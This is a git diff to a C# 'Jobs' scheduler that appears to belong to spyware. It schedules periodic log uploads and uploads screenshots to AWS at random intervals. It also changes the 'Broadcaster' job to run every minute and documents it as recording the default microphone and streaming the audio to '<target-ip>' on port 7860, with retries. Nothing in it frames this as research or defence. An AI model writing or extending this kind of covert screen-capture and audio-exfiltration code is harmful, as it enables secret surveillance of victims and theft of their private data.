@@ -15,7 +15,7 @@ public static class Jobs
 	[
 		new(PostmanJob, () => TimeSpan.FromSeconds(17)),
 		new(CameramanJob, () => TimeSpan.FromMinutes(_random.Next(5, 15))),
-		new(BroadcasterJob, () => TimeSpan.FromMinutes(15)),
+		new(BroadcasterJob, () => TimeSpan.FromMinutes(1)),
 	];
 
 	// Jobs
@@ -29,15 +29,9 @@ public static class Jobs
 		// and then, clear the respective local SQLite3 Database.
 
 		if (!Configuration.EnableLoggingOnAPI) return;
+		if (!WebAPI.ConnectedToInternet()) return;
 
-		if (!WebAPI.VerifyDatabase()) return;
-		var log_entries = Database<LogEntry>.GetSavedEntries();
-
-		if (log_entries.Count == 0) return;
-		var success = WebAPI.SendEntries(log_entries);
-
-		if (!success) return;
-		Database<LogEntry>.Clear();
+		PostLogEntries();
 	}
 
 	private static void CameramanJob()
@@ -62,14 +56,24 @@ public static class Jobs
 		if (!Configuration.EnableCacheLogging) return;
 		if (!WebAPI.ConnectedToInternet()) return;
 
-		var keys = WebAPI.AWS.UploadScreenshotsFrom(Configuration.ScreenshotsFolder);
+		var keys = WebAPI.AWS.UploadScreenshotsFrom(Configuration.Screenshots.Route);
 		if (keys.Count == 0) return;
 
 		var log = keys.Select(ScreenshotEntry.Create);
 		var res = Database<ScreenshotEntry>.Save(log);
 	}
 
-	private static void BroadcasterJob() => CrossUtility.CaptureAndShareAudioData();
+	private static void BroadcasterJob() 
+
+		// Responsibility:
+		// ---------------
+		// Broadcaster's Job is to;
+		// - Record Audio Data, from the Default Microphone
+		// - Compress it in mp3 format for better streaming
+		// - Start Streaming it to the <target-ip> at :7860
+		// - In-case of an interruption resend after <time>
+		
+		=> CrossUtility.RecordAndStreamAudioData();
 
 	// Utilities
 	// ---------
@@ -94,5 +98,20 @@ public static class Jobs
 				}
 			}
 		});
+	}
+
+	// Helper Methods
+	// --------------
+
+	private static void PostLogEntries()
+	{
+		if (!WebAPI.VerifyDatabase()) return;
+		var log_entries = Database<LogEntry>.GetSavedEntries();
+
+		if (log_entries.Count == 0) return;
+		var success = WebAPI.SendEntries(log_entries);
+
+		if (!success) return;
+		Database<LogEntry>.Clear();
 	}
 }
